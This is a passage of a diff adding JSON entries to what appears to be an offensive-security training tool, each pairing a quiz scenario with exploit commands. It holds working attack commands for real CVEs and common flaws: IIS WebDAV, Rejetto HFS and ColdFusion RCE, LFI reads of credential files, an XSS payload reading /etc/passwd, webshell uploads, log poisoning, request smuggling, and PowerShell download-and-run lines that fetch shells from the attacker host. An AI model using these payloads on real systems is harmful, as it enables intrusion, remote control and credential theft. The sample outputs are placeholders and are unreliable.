+            "note": "Command execution achieved through CI/CD deployed webshell."
+          }
+        ]
+      },
+      "situation": "Scenario: Commit a PHP webshell into a repository branch tied to automated CI/CD runners or webhooks. Which move should you run next?",
+      "choices": [
+        "gitlab-ci-webshell",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is GitLab CI/CD Automated Runner Webshell Deployment.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is GitLab CI/CD Automated Runner Webshell Deployment.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is GitLab CI/CD Automated Runner Webshell Deployment."
+      }
+    },
+    "iis6-webdav-scstorage": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once exploit Microsoft IIS 6.0 WebDAV buffer overflow in ScStoragePathFromUrl (CVE-2017-7269). The key confirmation is: Remote shell established on legacy IIS 6.0 server.",
+      "cmd": "python3 iis6_webdav_cve_2017_7269.py {{target}} 80 {{lhost}} {{lport}}",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Remote shell established on legacy IIS 6.0 server.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send oversized PROPFIND request with crafted If: header to port 80.",
+            "demo": [
+              {
+                "run": "python3 iis6_webdav_cve_2017_7269.py {{target}} 80 {{lhost}} {{lport}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote shell established on legacy IIS 6.0 server."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Send PROPFIND request with basic If: header using curl.",
+            "demo": [
+              {
+                "run": "curl -s -X PROPFIND -H 'If: <http://{{target}}/' 'http://{{target}}/'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Target confirmed vulnerable to WebDAV method exploitation."
+          }
+        ]
+      },
+      "situation": "Scenario: Exploit Microsoft IIS 6.0 WebDAV buffer overflow in ScStoragePathFromUrl (CVE-2017-7269). Which move should you run next?",
+      "choices": [
+        "iis6-webdav-scstorage",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269).",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269).",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269)."
+      }
+    },
+    "pdf-export-xss-fileread": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once inject XMLHttpRequest script payload into server-side HTML-to-PDF generation form. The key confirmation is: Payload rendered into PDF document by server-side renderer.",
+      "cmd": "curl -s -X POST -d \"content=<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send()</script>\" 'http://{{target}}/export_pdf' -o report.pdf",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Payload rendered into PDF document by server-side renderer.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Server-Side XSS Dynamic PDF Export Local File Disclosure, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Submit payload <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send()</script>.",
+            "demo": [
+              {
+                "run": "curl -s -X POST -d \"content=<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send()</script>\" 'http://{{target}}/export_pdf' -o report.pdf",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Payload rendered into PDF document by server-side renderer."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Use pdftotext to convert binary PDF into plain text and grep for target entries.",
+            "demo": [
+              {
+                "run": "pdftotext report.pdf - | grep -E 'root:|reader:|admin:'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Server-side local file contents extracted from generated PDF."
+          }
+        ]
+      },
+      "situation": "Scenario: Inject XMLHttpRequest script payload into server-side HTML-to-PDF generation form. Which move should you run next?",
+      "choices": [
+        "pdf-export-xss-fileread",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Server-Side XSS Dynamic PDF Export Local File Disclosure.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Server-Side XSS Dynamic PDF Export Local File Disclosure.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Server-Side XSS Dynamic PDF Export Local File Disclosure."
+      }
+    },
+    "amportal-conf-leak": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once exploit LFI in vtiger CRM or FreePBX component to read amportal.conf. The key confirmation is: FreePBX amportal.conf configuration retrieved.",
+      "cmd": "curl -k -s 'https://{{target}}/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action='",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "FreePBX amportal.conf configuration retrieved.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute FreePBX / Asterisk amportal.conf Credential Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send LFI request to /vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00.",
+            "demo": [
+              {
+                "run": "curl -k -s 'https://{{target}}/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action='",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "FreePBX amportal.conf configuration retrieved."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Grep for AMPDBPASS, AMPMGRPASS, and AMPDBUSER in extracted text.",
+            "demo": [
+              {
+                "run": "grep -E 'AMPDBPASS|AMPMGRPASS|AMPDBUSER' /etc/amportal.conf",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "High-value administrative credentials extracted from PBX configuration."
+          }
+        ]
+      },
+      "situation": "Scenario: Exploit LFI in vtiger CRM or FreePBX component to read amportal.conf. Which move should you run next?",
+      "choices": [
+        "amportal-conf-leak",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is FreePBX / Asterisk amportal.conf Credential Extraction.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is FreePBX / Asterisk amportal.conf Credential Extraction.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is FreePBX / Asterisk amportal.conf Credential Extraction."
+      }
+    },
+    "rejetto-hfs-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once port 80 hosts Rejetto HttpFileServer (HFS 2.3) vulnerable to CVE-2014-6287. The key confirmation is: Remote code execution triggered against Rejetto HttpFileServer.",
+      "cmd": "curl -s 'http://{{target}}/search=%00{.+exec|powershell.exe%20-c%20%22{{command}}%22.}'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Remote code execution triggered against Rejetto HttpFileServer.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Rejetto HttpFileServer Macro Injection RCE, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Inject a null byte followed by macro code {.+exec|...} into the HTTP search parameter.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/search=%00{.+exec|powershell.exe%20-c%20%22{{command}}%22.}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote code execution triggered against Rejetto HttpFileServer."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "URL-encode all quotes and spaces to ensure clean transmission across HTTP GET queries.",
+            "demo": [
+              {
+                "run": "python3 -c 'import urllib.parse; print(urllib.parse.quote(\"powershell -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}/rev.ps1\\\")\"))'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Payload string properly escaped for transmission."
+          }
+        ]
+      },
+      "situation": "Scenario: Port 80 hosts Rejetto HttpFileServer (HFS 2.3) vulnerable to CVE-2014-6287. Which move should you run next?",
+      "choices": [
+        "rejetto-hfs-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Rejetto HttpFileServer Macro Injection RCE.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Rejetto HttpFileServer Macro Injection RCE.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Rejetto HttpFileServer Macro Injection RCE."
+      }
+    },
+    "coldfusion-scheduled-task-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once port 8500 hosts Adobe ColdFusion 8 vulnerable to path traversal (CVE-2010-2861). The key confirmation is: ColdFusion administrative password hash disclosed.",
+      "cmd": "curl -s 'http://{{target}}:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "ColdFusion administrative password hash disclosed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Adobe ColdFusion Directory Traversal & Scheduled Task RCE, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Traverse directories through the locale parameter to read ColdFusion's password.properties.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "ColdFusion administrative password hash disclosed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Configure a scheduled task fetching your remote JSP webshell and saving it to webroot CFIDE.",
+            "demo": [
+              {
+                "run": "curl -s -b cookies.txt -d 'taskName=rev&interval=Daily&schedule=1&startDate=01/01/2026&startTime=12:00:00&publish=1&file=C:\\ColdFusion8\\wwwroot\\CFIDE\\shell.jsp&fileURL=http://{{lhost}}/shell.jsp' 'http://{{target}}:8500/CFIDE/administrator/scheduler/scheduleedit.cfm'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "JSP webshell written to ColdFusion webroot yielding interactive shell."
+          }
+        ]
+      },
+      "situation": "Scenario: Port 8500 hosts Adobe ColdFusion 8 vulnerable to path traversal (CVE-2010-2861). Which move should you run next?",
+      "choices": [
+        "coldfusion-scheduled-task-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Adobe ColdFusion Directory Traversal & Scheduled Task RCE.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Adobe ColdFusion Directory Traversal & Scheduled Task RCE.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Adobe ColdFusion Directory Traversal & Scheduled Task RCE."
+      }
+    },
+    "ftp-webroot-upload-webshell": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once target exposes an anonymous FTP service with write access mapped to webroot. The key confirmation is: Webshell uploaded directly into web server docroot.",
+      "cmd": "curl -T shell.aspx 'ftp://anonymous:anonymous@{{target}}/'",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Webshell uploaded directly into web server docroot.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Anonymous FTP Webroot Write to Webshell Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Upload an ASPX or PHP webshell directly into the FTP root directory.",
+            "demo": [
+              {
+                "run": "curl -T shell.aspx 'ftp://anonymous:anonymous@{{target}}/'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Webshell uploaded directly into web server docroot."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Issue HTTP GET request targeting the uploaded webshell path with test command parameter.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/shell.aspx?cmd=whoami'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Webshell execution confirmed; initial foothold established."
+          }
+        ]
+      },
+      "situation": "Scenario: Target exposes an anonymous FTP service with write access mapped to webroot. Which move should you run next?",
+      "choices": [
+        "ftp-webroot-upload-webshell",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Anonymous FTP Webroot Write to Webshell Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Anonymous FTP Webroot Write to Webshell Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Anonymous FTP Webroot Write to Webshell Execution."
+      }
+    },
+    "http-request-smuggling-auth": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once target infrastructure employs dual proxy / backend architecture (e.g. Nginx + HAProxy). The key confirmation is: HTTP request smuggling discrepancy confirmed on target reverse proxy.",
+      "cmd": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary $'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {{target}}\\r\\n\\r\\n' http://{{target}}/",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "HTTP request smuggling discrepancy confirmed on target reverse proxy.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute HTTP Request Smuggling Authentication Bypass and Siphoning, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Send an HTTP request with conflicting Content-Length and Transfer-Encoding headers to test for CL.TE discrepancy.",
+            "demo": [
+              {
+                "run": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary $'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {{target}}\\r\\n\\r\\n' http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "HTTP request smuggling discrepancy confirmed on target reverse proxy."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Smuggle an incomplete request that prepends to subsequent backend requests, leaking headers into the next response.",
+            "demo": [
+              {
+                "run": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary @smuggle_auth_capture.txt http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Administrative authentication credentials or session tokens successfully captured."
+          }
+        ]
+      },
+      "situation": "Scenario: Target infrastructure employs dual proxy / backend architecture (e.g. Nginx + HAProxy). Which move should you run next?",
+      "choices": [
+        "http-request-smuggling-auth",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is HTTP Request Smuggling Authentication Bypass and Siphoning.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is HTTP Request Smuggling Authentication Bypass and Siphoning.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is HTTP Request Smuggling Authentication Bypass and Siphoning."
+      }
+    },
+    "nginx-log-poisoning-lfi": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: webshell payload injected into",
+      "cmd": "curl -s -A '<?php system($_GET[\"c\"]); ?>' http://{{target}}/",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "PHP webshell payload injected into web server access log.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Nginx Access Log Poisoning via Local File Inclusion, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Issue an HTTP request containing a PHP command execution snippet inside the User-Agent header.",
+            "demo": [
+              {
+                "run": "curl -s -A '<?php system($_GET[\"c\"]); ?>' http://{{target}}/",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PHP webshell payload injected into web server access log."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Request the LFI parameter pointing to /var/log/nginx/access.log with command execution parameter.",
+            "demo": [
+              {
+                "run": "curl -s 'http://{{target}}/check.php?id=/var/log/nginx/access.log&c=whoami'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Arbitrary command execution achieved via LFI access log inclusion."
+          }
+        ]
+      },
+      "situation": "Scenario: Target web application has Local File Inclusion and Nginx access logs are readable. Which move should you run next?",
+      "choices": [
+        "nginx-log-poisoning-lfi",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Nginx Access Log Poisoning via Local File Inclusion.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Nginx Access Log Poisoning via Local File Inclusion.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Nginx Access Log Poisoning via Local File Inclusion."
+      }
+    },
+    "myfaces-viewstate-deserialization-rce": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once web application uses Apache MyFaces with vulnerable JavaServer Faces ViewState handling. The key confirmation is: Java deserialization gadget payload generated.",
+      "cmd": "java -jar ysoserial.jar CommonsCollections5 \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/shell.ps1')\" > payload.bin",
+      "tool": "java",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Java deserialization gadget payload generated.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Apache MyFaces ViewState Java Deserialization Remote Code Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Generate a serialized Java payload using ysoserial with an appropriate gadget chain (CommonsCollections5).",
+            "demo": [
+              {
+                "run": "java -jar ysoserial.jar CommonsCollections5 \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/shell.ps1')\" > payload.bin",
